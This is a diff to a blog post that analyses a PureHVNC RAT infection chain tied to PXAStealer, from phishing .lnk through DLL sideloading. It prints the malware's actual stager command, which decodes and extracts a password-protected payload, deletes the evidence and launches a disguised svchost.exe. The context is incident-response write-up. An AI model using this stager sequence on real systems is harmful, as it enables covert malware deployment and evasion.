@@ -1,5 +1,5 @@
 ---
-title: Seven - Malware Analysis - Multi-Stage PureHVNC RAT
+title: Seven - Malware Analysis - Multi-Stage PureHVNC RAT - Part of PXAStealer
 date: 2025-08-06 01:00:00 +0530
 categories: [Days of Security, Reverse Engineering, Incident Response, Malware Analysis]
 tags: [Malware Analysis]
@@ -9,12 +9,12 @@ This piece of malware was spotted in one of the incident for which I led the res
 To give more context to it. It was a PXAStealer attack as seen on [SentinelOne](https://www.sentinelone.com/labs/ghost-in-the-zip-new-pxa-stealer-and-its-telegram-powered-ecosystem/). SentinelOne focused more on the PXAStealer(DLL) aspect, whereas this one is a later step in the infection chain leading to persistence.  
 
 ### How we got here?
-The user received a phishing link on their personal email address and opened it on their corporate device and it started the infection. It originated through a  .lnk file which is consistent with previous PureHVNC infections. The .lnk file included a obfuscated script which initiated the download of a master zip archive.  
-That was followed by the creation more zip archives with .pdf extension which originated from master zip file and were extracted. Python launcher, malicious dll and all dependencies, were extracted from the zip archives in the "C:\Users\Public\Windows\" directory and once the DLL was sideloaded into MS Word binary, it executed the below mentioned command and which in turn exectued python script in memory. I can't share the screenshots or more information as it might contain senstive information. From the very beginning, the attack happened mainly through memory only. Here's the initial stager command from the sideloaded DLL. 
+The user received a phishing link on their personal email address and opened it on their corporate device and it started the infection. It originated through a  .lnk file which is consistent with previous PureHVNC and PXAStealer infections. The .lnk file included a obfuscated script which initiated the download of a master zip archive.  
+That was followed by the creation more zip archives with .pdf extension which originated from master zip file and were extracted. Python launcher, malicious dll(PXAStealer) and all dependencies were extracted from the zip archives in the "C:\Users\Public\Windows\" directory and once the DLL was sideloaded into MS Word binary, it executed the below mentioned command and which in turn exectued python script in memory. I can't share the screenshots or more information as it might contain senstive information. From the very beginning, the attack happened mainly through memory only. Here's the initial stager command from the sideloaded DLL. 
 ```
 cmd /c cd "" && start "Google Ads Playbook.docx" && certutil -decode Document.pdf Invoice.pdf && images.png x -ibck -y -poX3ff7b6Bfi76keXy3xmSWnX0uqsFYur Invoice.pdf C:\\Users\\Public && del /s /q Document.pdf && del /s /q Invoice.pdf && del /s /q images.png && del /s /q "Contract Invoice.docx" && del /s /q "Evidence Report.docx" && cd C:\\Users\\Public\\Windows && start svchost.exe Lib\\images.png MR_Q_NEW_VER_BOT && exit && exit
 ```
-Sadly I was not able to get my hands on the very initial payload which initated the download due to undisclosable reason hence, the lack of information in this step. But the silver lining is that we have the actual malicious payload and we know the methodology followed by the stager. Let's begin with the actual payload. All the IOCs will be mentioned in the appendix.
+Sadly I can't share the info on the very initial payload which initated the download due to undisclosable reason hence, the lack of information in this step. But the silver lining is that we have the actual malicious payload and we know the methodology followed by the stager. Let's begin with the actual payload. All the IOCs will be mentioned in the appendix.
 
 ### Initial script
 The initial payload is a python script which is executed in memory with the following command  
